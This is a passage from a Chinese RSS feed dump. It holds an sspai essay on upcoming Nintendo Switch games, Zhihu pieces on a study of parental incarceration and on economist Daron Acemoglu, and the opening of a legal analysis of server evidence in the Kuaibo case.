src=\"https://cdn.sspai.com/2022/02/14/c6d1d0c31a1db74f0206796b56f46d92.jpg\"><figcaption>塞尔达传说 梅祖拉假面（2000）</figcaption></figure><p>谈回《旷野之息》的续作，许多玩家猜测它会和上述的情况接近，在画面表现无需有本质变化的前提下，加入更多新内容和新系统，并补全前作的剧情内容。这一猜测到目前为止都十分合情合理，而且后续官方放出的多个展示片段也都符合这一猜想。</p>\n<p>唯一的问题在于，既然建立在前作开发经验的基础之上，这部作品本不会需要太长的开发周期，可为什么它会迟迟难以竣工，以至于要在前作发售的 5 年后才能面世？就算是一直以「慢工出细活」为开发标准的《塞尔达传说》系列续作，这个周期还是显得有点久了。</p>\n<p>或许是受到疫情的影响，或许是 Switch 尴尬的性能天花板让这部作品的创新难以施展拳脚，又或许这只是任天堂上层出于商业目的故意而为之……具体的情况谁也不知道，我也就不在这里瞎猜了。但我觉得可以预见到的是，这部作品的开发过程肯定也不如任天堂一开始计划的那样顺风顺水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/0578c160c7703bac667614fba7abdcc6.jfif\"><figcaption>塞尔达传说 时之笛（1998）</figcaption></figure><p>不管怎样，作为 Switch 最重量级的护航作，同时也是任天堂旗下最重要的 IP 之一，很难想象任天堂会在这个系列的正统续作的开发过程中有丝毫松懈的可能。所以「如果一定要翻车」，那也只能有下面这几种可能：</p>\n<ol>\n<li>剧情设计出现问题，比如不小心触及敏感话题，或某角色的设定、行为、或某情节的处理不当而引发玩家群体的不满。</li>\n<li>程序优化出现问题，致使许多新内容在 Switch 的掌机模式下难以正常运行，或者整个游玩过程充斥着玩家难以忍受的掉帧、画面模糊等。</li>\n<li>游戏整体氛围问题，也许这次林克的待遇比前作还要残忍数倍，以至于玩家通关后怀疑人生，开始往任天堂本部寄刀片。</li>\n</ol>\n<p>首先第一条，这种「翻车姿势」在这个行业已经不算新鲜事了，各个厂商都已经学会了比以往更加谨慎的处理这些细节。而任天堂毕竟是个注重题材合家欢、力图让旗下作品都能适用于更广泛人群、更广泛年龄层的日企，我相信他们会处理的很「圆润」。</p>\n<p>而第二条则是最有可能发生的，毕竟《旷野之息》中的迷雾森林地图就被大部分玩家反馈了掉帧现象，虽然有团队在早期开发中尚未完全摸索到 Switch 开发边界的原因，但是也侧面表现出 Switch 的机能限制对哪怕第一方的团队开发都称不上特别友好。</p>\n<p>任天堂第一方团队天才般的程序优化能力一直是整个业内津津乐道的事实。他们也经常在诸如 GDC 这样的场合分享他们是如何利用「奇思妙想」去攻克性能限制难题的。希望他们已经在这 5 年的时间里积累了更多的开发经验以应对这一难关吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/2075bf05852dac796169d6a2f033cb5d.jpg\"><figcaption>实际内容如果真的会有这些看起来有体积的云持续显示的话……</figcaption></figure><p>至于第三条，别笑，还真有可能。且不说预告片目前展示的内容就包含塞尔达公主的「得而复失」这种伤感的戏码，而且类似的事情在《梅祖拉假面》时期就发生过：部分玩家对于这部讲述末世之下悲伤氛围的作品难以接受，它暗藏的部分「致郁」情节也在一定程度上影响了发行时的年龄评级和媒体评价。</p>\n<p>不过就我个人想法来说，反而严重怀疑这会是一部围绕「时间回溯」为主线、历尽万难后终于使一切失而复得，进而达成大团圆结局的皆大欢喜故事。</p>\n<h3>斯普拉遁 3</h3>\n<p>《斯普拉遁 2（Splatoon 2）》是我 Switch 上游玩时间最长的游戏，这整整 560 个小时以上的重复游玩都没能产生足量的倦意让我放下它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/3e3bf3e756ab7cf7924b1160eb37fd01.png\"><figcaption>只可惜我是依然个无法升到 S+ 段的菜鸡 (´-`)</figcaption></figure><p>作为少数能在日本玩家群体中兴盛起来的「电竞」，《斯普拉遁》系列最吸引我的不仅仅是它那一看就能让人上瘾的「打水仗」玩法，还有它那极为出彩的艺术设计。</p>\n<p>由于在前作的最后一个官方赛季「最终祭典」中，支持「混沌阵营」的玩家在比分上超过了支持「秩序阵营」的玩家，《斯普拉遁 3》决定以充满野性和混沌的艺术风格定稿。可以认为这一美术风格的改变几乎是由核心玩家们自己票选出来的，所以美术团队也可以比较放心大胆的去做风格上的创新，而无需担心玩家会对此有过多意见。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/68a7f48bfc4743c52c0783541dc6bf8e.jpeg\"><figcaption>万圣节官方贺图</figcaption></figure><p>对于这款游戏，如果你还想问我「它会不会翻车」，我只能回答：你倒是告诉我它要怎么做才能出问题？！(╯‵□′)╯︵┻━┻</p>\n<p>毕竟核心玩法是对称式 PVP 竞技，系统几乎不需要有多大创新。既然 2 代能照搬 1 代的玩法和地图，3 代就能接着照搬 2 代。为了优先照顾竞技的平衡性，除了增加新地图、新武器、新技能外，机制的调整和新机制的增加都会较为细微——这类游戏通常不会进行大刀阔斧的修改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/8fbb44d222194942bf4e99d4909788ad.jpg\"></figure><p>简单来说，这类作品的定位基本上就是上一代的「威力加强版」，实际表现只会和前作持平或是变得更好。照着前作的模样再加料做个差不多的就行了，难道会有团队连这样的工作都做不好吗——什么，你说隔壁的《战地》系列？呃，好问题……🤔</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/b04758fcff6540a1805d4144145454ed.jpg\"><figcaption>真不愧是你啊，EA</figcaption></figure><p>好吧，如果一定要说的话，我只能想到一种情况能够暂时毁掉《斯普拉遁 3》：数值平衡问题。比如新作一上线就发现存在某把滥强武器血洗天梯，让其余那数十把武器都仿佛形同虚设，又或者是 PVE「打工模式」预告片里那堆能把一根柱子杵地上让你顺杆爬的鲑鱼实在难的离谱，致使这个模式的「收益与难度比」低到没人玩……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/e2148c3b894b9f663e4fa610a4e3e5a4.png\"><figcaption>这鱼以我以往的打工经验来看真有点犯怵……</figcaption></figure><p>从主观上来说，我个人对任天堂第一方在数值平衡方面的专业能力十分信任。毕竟他们可是能够让《任天堂明星大乱斗》70 余个角色都维持各有千秋、让《斯普拉遁 2》里 140 种武器达成微妙均衡和百花齐放的好几个超强团队啊。</p>\n<p>可能是因为我玩的网游并不算多，见得世面少了，但能在这个平衡难度下做到这种程度的运营团队，我实在是没见过可以与之相提并论的了。</p>\n<p>退一万步讲，就算他们真的一开始搞砸了数值平衡，《斯普拉遁》也是个会持续热更新的游戏，它可以一直维护游戏内的平衡性更新直到下一代作品诞生（甚至更久）。尤其是在运营后期，内容不再新增的情况下，天梯环境很快就可以稳定下来。</p>\n<p>顺便一提，这次是本系列首次加入官方中文，想必定会比前作更能挑起国内玩家的入坑欲望。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/fbfdc85f65990a46315ad6584bea19eb.jpg\"><figcaption>快点发售吧，我都等不及要虐菜上分了！(*≧ω≦)</figcaption></figure><h3>还有它们</h3>\n<p>其实我对《异度神剑 3》的期待程度一点也不输给《塞尔达传说》和《斯普拉遁 3》。这是一个在 JRPG 爱好者群体中久负盛名的系列。对于我来说，在这个 JRPG 日渐式微的当下，它是少数饱含了系统创新与令人满意的内容体量的「良心作」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/8ac12caa394d83351559ff8047f9a38e.jfif\"></figure><p>不过，期待归期待，《异度神剑》系列还是有不少必须直视的问题存在的。比如初代《异度神剑》中存在被不少玩家诟病的部分剧情情节，《异度神剑 2》则是有不少玩家认为女性角色的人设过于「媚宅」，而且这两部作品在 Switch 上的画面表现都比较堪忧，在动态下很容易糊成一片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/c06c9ba30312c9160539e1a8bdbd7255.png\"></figure><p>虽然目前只有一个预告片，但已经可以看出整体人设的风格都有了较大变化，仿佛是在第二代的基础上又向最初的第一代偏清新的风格迈了一步。剧情主线看起来将会贯穿一代与二代两部作品，彻底融合两部作品的世界观，听起来十分大胆。</p>\n<p>不过，画面模糊的问题貌似依然没有得到完全解决……( ´_ゝ｀)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/ab9b27288fb21206ed139d25ab1887e2.png\"></figure><p>原本《超级马力欧 奥德赛》就是一款在玩法上对《星之卡比》系列有所借鉴的作品，而这次的《星之卡比 探索发现》看起来似乎又从《奥德赛》中反哺回了不少设计经验，可以期待看到一部有开创性体验的系列 3D 卡比新作了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/efaaa627fa260b21a63c7dc613c89d27.jpg\"></figure><p>《Nintendo Switch Sports》可以认为是曾经火爆于 Wii、售出 8000 万份以上怪物级销量的体感游戏《Wii Sports》的续作。对于这个曾将 Wii 一举推入蓝海市场大卖特卖的作品系列，光是凭这个噱头估计都能收获不错的销量。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/02283ffc25f42b98743c752f48200799.jfif\"></figure><p>不过体感游戏已经不再是当年有划时代意义的体验了，尽管 Switch 的体感相比于当年的 Wii 已经不可同日而语，但这款游戏所面向的受众与需求变化也同样会带来不少市场上的不求定因素。尚且不知任天堂是否有非常认真地对待和打磨它，总之我还是要买一份试试看的。</p>\n<h2>关于游戏消费的未来</h2>\n<p>文章至此，我想我对 Switch 这台游戏机的热爱已经传达给你了。至于你是否和我一样喜欢任天堂的游戏、期待即将到来的这些新作，以及是否打算入手一台 Switch，这就取决于你自己的判断了。</p>\n<p>尽管本文仿佛是在通篇力捧任天堂，但从写作的本心上来说，我是不打算为任何厂商「站队」的。我很喜欢任天堂旗下的多数产品，感叹这逾越百年历史却依然能保有创新力的公司结构，欣赏每一个惊人作品背后的每一位开发者们为之付出的努力，感慨 Nintendo Switch 为我带来的持久而愉快的消费体验……不过，也仅此而已。</p>\n<p>2022 年了，作为玩家的我们大可不必再为不同平台、不同产品的差异而产生争执。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/249055f15bed2cbb0419d2269e7a544d.png\"><figcaption>（图片来源于网络）</figcaption></figure><p>以往所谓的「主机大战」是建立在一个大前提上的：曾经的大部分消费者对家用游戏机产品的消费预算通常都很有限，因此他们总会选择自己主观上最为青睐的一个平台的产品，在圣诞节为孩子购买一台游戏机作为圣诞礼物。</p>\n<p>这种消费规律致使游戏机厂家不约而同的集中在同一时间点发布自家的新产品，并且产品定位通常会非常接近，主要目的就是为了在同一赛道的正面竞争中打压竞品，进以独吞整块蛋糕。</p>\n<p>为了打赢这种正面交锋的商业战争，除了提升自家产品的卖相，厂家还会穷其所能地使用各种手段去抹黑竞争对手、往自己脸上贴金——哪怕有些时候，这些竞争手段并不那么「正当」。这是资本公司天然逐利性下的必然。</p>\n<p>「如果我打算选购一台游戏机，我应该买哪家的呢？」——玩家为「游戏机哪家强」这样的话题争执不休也是在这样的商业竞争环境下促成的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/17cea44a3fba4e461c3c44334bdbe9f7.jpg\"><figcaption>（图片来源于网络）</figcaption></figure><p>但是，随着时间的推移，这场持续了数十年的「主机大战」的大前提早就已经动摇了。</p>\n<p>在 Newzoo《全球游戏市场报告》的统计数据显示，2021 年全球玩家人数累计超 30 亿，游戏市场产生的总收入高达 1803 亿美元；全球移动设备的游戏收入占比超越了主机与 PC 端收入的总和；许多 PC 玩家为了畅玩「3A」大作甚至愿意在产能严重短缺的背景下高价购入游戏显卡……游戏在娱乐消费行业的地位与日俱增，市场普遍的消费意愿与消费能力今非昔比。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/23b47576daf4564771c08ae33753d6bf.jpg\"></figure><p>此外，同样因为全球游戏市场的消费人群的扩张和消费能力的与日俱增，以及游戏开发及游戏发行准入门槛的降低，当前市面上游戏产品的数量、多样性及丰富程度达到了史无前例的高度。游戏厂商之间的竞争重点已经开始转向了争夺玩家有限的精力和注意力上。</p>\n<p>因此，在平台多样化的这一背景下，以往的平台独占销售模式已经不再是大部分游戏开发商的首选。依此规律，平台独占的第三方作品可能会越来越少。</p>\n<p>「主机大战」即将迎来一个句点，主机厂家各自走向了不同的差异化市场，在相似却又各不相同的赛道上并行发展。为了增强自家平台对用户的吸引力，要么选择进一步扩充自主开发的第一方作品独占，要么选择采用新的销售模式。目前来看，任天堂选择的是前者，对第一方阵容保持应有的高制作水平；而隔壁微软则选择了后者，力推以 XGP 为首的游戏订阅模式，并布局了跨平台的云端串流游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/d9ff3e8aee89d19aa234f311eb5800a7.jpg\"></figure><p>不过，任天堂可能也不乏有别的考虑。至少从我的视角来看，自从《大侦探皮卡丘》的真人电影创造了游戏改编电影历史上的票房新纪录，在环球影城开起了主题乐园「超级任天堂世界」，连曾被雪藏了 20 多年的《超级马力欧兄弟》真人电影 IP 都能拿出来拍新作……种种迹象都在很明确的诉说着任天堂的商业野心——希望借由品牌及 IP 运营的新模式拓宽更多领域的市场。</p>\n<p>说不定在不久的未来，任天堂真的会在主题乐园领域与业界巨头迪士尼正面竞争也说不定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/2b657f35ed0600b91c5e19e42f7a578e.jpg\"></figure><h2>写在最后</h2>\n<p>就写到这里吧。以上是我个人自从看完任天堂直面会之后的有感而发，聊了不少杂七杂八的话题。</p>\n<p>总而言之，2022 年是我非常期待的一年，不仅仅是因为以任天堂旗下 IP 为首的一大批优秀产品即将竣工，更是因为希望看到全球游戏行业能够慢慢褪去 2021 的阴霾，逐步走上正轨。</p>\n<p>感谢你耐心地阅读，最近疫情反复，注意通勤卫生安全。( ′▽`)</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71413"},{"title":"当父母缺席","date":"2022-02-16 05:18:13","description":"\n<p data-pid=\"E_fXcKb8\">一般而言，我们可能会认为父母坐牢会给子女的成长带来负面影响。这可能是因为这会导致家庭收入的下降，也可能是因为父母的陪伴对子女的成长非常重要。</p>\n<p data-pid=\"lToP9EfG\">不过，今年刚发表在AER上的一篇文章却在这个话题上带来了一个出人意料的结果。他指出，虽然可能对大部分父母来说，以上的逻辑都是成立的，但父母必然对子女带来正面影响，也未必就是个放之四海而皆准的假设。豆瓣父母皆祸害小组里，曾经有过很多这样的故事。而一旦我们接受部分父母也许会对子女造成负面影响，那么这些父母坐牢，对子女就反倒可能是个好消息。</p>\n<p data-pid=\"Y3p7mwxY\">不仅如此，他还认为，入狱是犯罪的结果，而非原因。那么给定父母会从事犯罪行为的话，那入狱实际上会减少父母继续犯罪的可能，即使是父母中未入狱的那位，在此之后犯罪的可能一般也会下降，这会对子女带来正面影响。此外，此前有研究发现，入狱会减少入狱者的外部选择，反倒会让他/她更重视当前的关系，从这个角度来说，父母入狱，可能会让家庭关系变得更加稳固，这同样有利于子女的成长。第三，父母入狱这事，也可能会让子女更清楚地认识到犯罪的成本，从而减少在成年后走上这条道路的可能性。</p>\n<p data-pid=\"xBtAYIdO\">总而言之，作者指出，虽然如果我们对比有父母入狱的家庭和普通家庭，多半会发现后一家庭出身的孩子成长得会更好。但这多半是因为前一家庭的父母参与犯罪，而非入狱，入狱只是犯罪的结果。因而如果我们对比的对象是两个有本来父母就有较高可能参与犯罪的家庭，前者的父母入狱了，而后者没有入狱，那么很有可能前者家庭的子女，反倒会成长得更好。因而对这些家庭的子女，父母入狱反倒可能是件好事。</p>\n<p data-pid=\"7cW82Fcx\">为了证明这一点，作者需要将对比的对象集中在犯罪可能较高的家庭当中，如果能找到一些这样的家庭，其中一部分父母有入狱，另一部分没有，那么就能实现此前所述的对比了。但问题是，入狱又不是随机事件，被判入狱，本身可能就意味着犯罪行为更严重更频繁，这样当我们对比有无父母入狱家庭时，很可能看到的依然是犯罪而非入狱的影响。要消除这个影响，我们就得找到一个会影响入狱可能的外部因素，如果我们能确信某些家庭有无入狱只是因为某些外部因素差异导致的，而这些外部因素又不会通过其他渠道影响子女的犯罪，那再去对比这些家庭，我们就能比较干净地获取入狱本身对子女成长的影响了。</p>\n<p data-pid=\"5USyZMtV\">作者使用的数据来自美国俄亥俄州的几个县，他研究的对象，是那些因为各种刑事原因被起诉的被告所在的家庭，其中有些人被判入狱，有些人没有。而他找的那个外部因素，则是庭审时法官的分配。为确保公平，这个分配是随机的，因而逻辑上说不太可能通过其他渠道影响被告家庭子女的成长。而与此同时，不同法官在判决/诉辩交易时的严厉程度差异相当大，同样的被告，在碰到严厉的法官时，入狱的可能性就会大大增加。因而随机分配到的法官的严厉程度，就构成了我们想要的外部因素。或者用经济学术语来说，就是工具变量。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8cadf64f88607827dcf83119bc75634c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"690\" class=\"origin_image zh-lightbox-thumb\" width=\"589\" data-original=\"https://pic1.zhimg.com/v2-8cadf64f88607827dcf83119bc75634c_r.jpg\"></figure><p data-pid=\"FjpMTCLf\">结果如上表所示，Panel A的结果没有使用工具变量，此时父母是否入狱的影响是正的。这就相当于说，对比有父母入狱的家庭和其他家庭，前者子女此后参与犯罪的可能性更高。</p>\n<p data-pid=\"bd8TG9yG\">但一旦我们使用了工具变量，从Panel B到Panel E，父母入狱这个变量的系数就都是显著为负了，这相当于说，对父母处在入狱边缘，仅仅因为法官分配就入狱/未入狱的家庭，父母入狱这件事情，反倒会减少子女此后参与犯罪的可能。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-a16247aa543991e7ce7f7c0fcc402bf7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"497\" data-rawheight=\"554\" class=\"origin_image zh-lightbox-thumb\" width=\"497\" data-original=\"https://pic4.zhimg.com/v2-a16247aa543991e7ce7f7c0fcc402bf7_r.jpg\"></figure><p data-pid=\"QfnJSilF\">不仅如此，作者还发现父母入狱还会对这些家庭子女成年后的其他情况也产生显著正面影响。比如上图的结果就表明，父母入狱显著提高了子女成年后所居住社区的质量。</p>\n<p data-pid=\"0-C3w_XR\">那这个结果究竟是产生的呢？其主要渠道是什么？作者此后进一步的分析，发现此前所述的大部分渠道，都能找到一些证据。比如，作者发现入狱者在出狱后，跟原有配偶生育更多子女的可能性增加了，而跟其他人生育的可能性则下降了。这反映了家庭的稳固程度的提高；发现父母中未入狱的那位，此后参与犯罪/入狱的可能性下降了。</p>\n<p data-pid=\"qG5RNN-v\">此外，如果父母入狱可能有好处的话，兄弟/姐妹的入狱，同样可能循着类似的渠道给未入狱一方带来好处。作者也的确发现，有兄弟/姐妹入狱的情况下，此后一两年内未入狱一方犯罪的可能性会显著下降。</p>\n<p data-pid=\"5ek_nD7_\">总而言之，这篇文章有力而可靠地说明了对部分人群来说，父母的入狱，未必是一件坏事。当然，这个结论不可能具有很强的可推广性。事实上，我非常相信，如果你在大街上随机地找个人把他关到监狱里，比如长沙那位无辜的货拉拉司机，那么多半会给他子女的成长带来非常显著的负面影响。事实上，作者也承认，此前不少针对挪威、芬兰、瑞典等北欧国家所做的研究，都发现父母入狱会对子女产生不显著或者负面的影响。但这些矛盾，并不是在否定现在这篇文章的结论，相反，我觉得这一定程度上是在佐证他的结论：在这个多样化的世界当中，有些对整体而言成立的规律，放在个别人群当中，结果可能截然不同。</p>\n<p data-pid=\"VvbnUauw\">此外，这个结论也不由让人想起关于社会化抚养的一些争论。此前对社会化抚养的一个主要批评是，除了父母之外，其他人可能缺乏足够强的激励来抚养好一个孩子，这样，要达到与家庭抚养差不多的成果，社会化抚养所需要支付的成本可能要高得多。</p>\n<p data-pid=\"qiS4a9e2\">但按照现在这篇文章的逻辑，也许并非所有父母都有比一般人强得多的激励来抚养子女，从这个角度说，如果社会化抚养不是一开始就抱着消灭家庭的远大理想，而只是试图去补充完善家庭抚养，去替代其中不合格的局部，那即使在短期内，一个良好的社会化抚养体系也是有价值的。事实上，目前就有不少研究已经发现，一些非常简单的外部帮助，就可以显著地改善困难家庭儿童的成长。</p>\n<p data-pid=\"Is5vGYNz\">参考文献：</p>\n<p data-pid=\"VaZNntgU\">Norris, Samuel, Matthew Pecenco, Jeffrey Weaver, 2021, The Effects of Parental and Sibling Incarceration: Evidence from Ohio, <i>American Economic Review, </i>111(9): 2926-2963.</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/feng-han?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">冯晗</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/410632327?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"如何评价 MIT 经济学教授达龙·阿西莫格鲁 (Daron Acemoğlu)？","date":"2022-02-16 05:18:04","description":"\n<p data-pid=\"0nE20xdE\">利益相关：笔者哥伦比亚大学SIPA博士毕业，UCLA商学院博士后在职，接受过经济学和心理学的博士科研训练。</p>\n<p data-pid=\"Vz_aUy5W\">2021年看他，先上这么个结论：一个非常擅长把分析和数理思维应用到社会经济领域的人，一个从方法论和建模能力方面堪称顶级的经济学研究者，但不是一个合格的实践研究和政策建议者。</p>\n<p data-pid=\"xDGr0How\">笔者认为他对经济学最大的贡献是在Methodology方面。他的研究（很多层面上其实是基于他老婆的帮助，他老婆是个Network大佬），在一些领域，如宏观经济学、社会网络等，他的贡献使得学术界的方法论有了十足的进步，例如他<b>将网络分析应用于宏观领域，系统性地刻画了上下游产业的关系结构</b>，甚至让一度被淘汰的投入-产出表重获新生，这些“以微观分析宏观“的方法是他分析和数理思维的优势所在，是非常重要的学术成果。另外，在关于技术进步（如AI和人类之间的替代和互补问题及对劳动力市场的影响）等领域，他同样有着深刻的认识，能够动态地看待问题，这一点在 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/06916ab5292b620917a7be1b4945a19d\" data-hash=\"06916ab5292b620917a7be1b4945a19d\" data-hovercard=\"p$b$06916ab5292b620917a7be1b4945a19d\">@司马懿</a> 大佬的答案中写的也非常好，他<b>内生化了技术的发展方向，</b>巧妙地模型化了人类社会会自我调节自动化和新职位之间的关系这一重要事实。这些都是他作为顶级的方法论研究者和建模者的素养，是我们作为经济学者值得学习和仰望的地方。</p>\n<p data-pid=\"_ibnRmtW\">然而，他最擅长的“动态地、发展地看待经济问题“的能力到了他非常喜欢涉足的政治经济学领域却全无踪影。Why Nations Fail这本最知名的书籍，讲的基本上和车轱辘话没有区别。在2021年的NBER Working Paper里面又开始创造一些前言不搭后语的理论来论述为啥只有西方的制度是可以持续的。从这个角度笔者甚至开始怀疑他做这个领域全是生意，只有前面的领域才是真正的学术。</p>\n<p data-pid=\"MLFSn6eC\">如果不考虑这一点的话，那么他和他的学派，以及一些风格类似的研究者例如UC Berkeley的Gerard Roland等等，都常见同一个毛病：过度地简化“人”的架构，不肯偏离“理性人”的核心假设分析Political Economy和Institutional Economics的问题。这种思路在我们行为经济学家看来是相当偏颇乃至危险的，因为对于“理性人”的系统性大范围偏离，会导致基于“理性人”假设推导出的“最优制度“的有效性大打折扣，甚至跌到谷底，如果盲目地自上而下遵从这种“唯一性”的推理制定政策，那么悲剧是理所当然的。</p>\n<p data-pid=\"8VHFp9JH\">从Akerlof的《动物精神》到Kaplan的《理性选民的神话》，美国研究者们对此的反思从未停止，但Acemoglu的习惯是都看不见。</p>\n<p data-pid=\"hnG6mbkK\">事实上，美国人在政治方面的权利和制度上的优越性，随着<b>移动互联网的发展带来的信息过载</b>，基本上都在Information Cascade（信息级联）、Motivated Reasoning（动机性推理）、Confirmation Bias（确认性偏差）等重要的行为偏误下，已经成为了新时代最大的幻觉。Acemoglu在这个领域的抱残守缺，上来就以Democratic和Authoritarian的二极管思维看待21世纪的政治经济学，实在是对不起他在其他领域的卓越贡献，回头好好搞methodology improvement才是他后半生能给经济学学术界最大的贡献。</p>\n<p data-pid=\"oG0nfo7C\">而且，他在近几年学阀倾向非常明显，发表鱼龙混杂，经济学学术界有这么个笑话，“Acemoglu's Correlation is Causality“，这句话啥意思，接受过经济学研究训练的人都懂。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jungusrong-ge-si?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Jungus荣格斯</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24248273/answer/2070512093?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">22 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30279283?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">比之 MIT 和 Harvard，芝加哥大学的经济系最近发展如何？</a><br><a href=\"http://www.zhihu.com/question/330605171?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">美国的助理教授和副教授会不会自称教授？</a><br>\n","link":"http://www.zhihu.com/question/24248273/answer/2070512093?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"快播案七周年（二）——关于快播案证据的分析","date":"2022-02-16 05:17:27","description":"\n<p data-pid=\"IhRoo4Hy\">继续讨论快播案，正如我们上次写到的，本案庭审中在举证质证包括法庭辩论环节，<b>就涉案证据主要就是围绕四台服务器及相应的鉴定意见进行的</b>。这篇文章，我们主要围绕这一问题进行梳理分析。</p>\n<p data-pid=\"JwtAp54_\">一、涉案四台服务器的流转情况：</p>\n<p data-pid=\"HFC50Lkz\">就公诉人一方举示的证据来看，本案涉案的四台服务器流转情况如下：</p>\n<p data-pid=\"5TdEZBJp\">2013年上半年，北京网联光通技术有限公司与快播公司开展合作，光通公司提供四台服务器，快播公司提供内容数据进行远程维护。</p>\n<p data-pid=\"Oa27dJYn\">2013年11月18日，北京市海淀区文化委员会根据北京市版权局的办案线索进行执法检查时，从光通公司查获此四台服务器。同日将该四台服务器交给北京市版权局进行鉴定。北京市版权局当日委托文创动力公司提供专业技术服务，将QVOD文件格式转化为MP4格式。</p>\n<p data-pid=\"NyzTd4IO\">2014年4月10日，北京市海淀区公安局从北京市版权局调取涉案四台服务器。并委托文创动力公司提供技术支持，将碎片格式进行转码。</p>\n<p data-pid=\"7SeHE3vA\">二、控辩双方争议的焦点：</p>\n<p data-pid=\"R6XspcQ6\">北京市公安局总共进行了三次鉴定，按照公诉人的说法第一次鉴定为临时性鉴定，第二次鉴定为正式鉴定，第三次鉴定为对第二次鉴定的补充鉴定。同时公诉人安排了鉴定人员出庭作证。同时为了保证服务器数据没有被污染，公诉人还出示了北京信诺司法鉴定所的鉴定意见，证实扣押的四台服务器有一台损坏，其与三台在2013年11月18日至2015年12月2日期间没有任何数据拷入。</p>\n<p data-pid=\"oesrQVAN\">辩护人的主要意见是：1、涉案的服务器是由文创动力公司开启，程序违法，文创动力公司还在为快播公司的竞争对手服务。涉案服务器在文创动力公司长期保存原始数据存在被污染的可能。2、公诉机关没有权利在审理阶段进行第三次重新鉴定，且第三次鉴定与第二次鉴定人为同一人不符合程序性要求。也没有所谓临时性鉴定的说法。3、信诺的鉴定意见中的硬盘数量与扣押时记录的数量不一致，公诉人无法解释。4、信诺的鉴定没有意义，只需要把数据更改或者硬盘换掉就可以了。</p>\n<p data-pid=\"I_wj9wMe\">三、相关证据的分析</p>\n<p 